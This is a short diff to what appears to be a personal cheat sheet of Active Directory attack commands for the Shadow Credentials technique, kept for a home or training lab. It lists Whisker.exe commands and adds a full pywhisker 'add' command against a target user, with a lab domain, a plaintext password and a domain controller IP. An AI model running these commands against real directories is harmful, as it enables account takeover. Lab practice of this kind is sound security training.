@@ -23,8 +23,18 @@ Get-DomainObjectAcl  | Where-Object { $_.ObjectAceType -eq "5b47d60f-6051-40fb-9
 .\Whisker.exe list /target:TargetObject
 
 .\Whisker.exe remove /target:TargetObject /deviceid:<DeviceID_from_add_command>
+```
 
-python3 pywhisker.py -d "lab.local" -u "attacker_user" -p "password" --target "target_user" --action "add"
+# PyWhisker
+```powershell
+python3 /home/sako/Tools/pywhisker.py \
+  -d "warzone.oxsium.local" \
+  -u "ShadowOperator1" \
+  -p 'Oxsium_Lab123!' \
+  --target "VictimUser" \
+  --action "add" \
+  --dc-ip 192.168.0.199 \
+  --use-ldaps
 ```
 
 # Rubeus
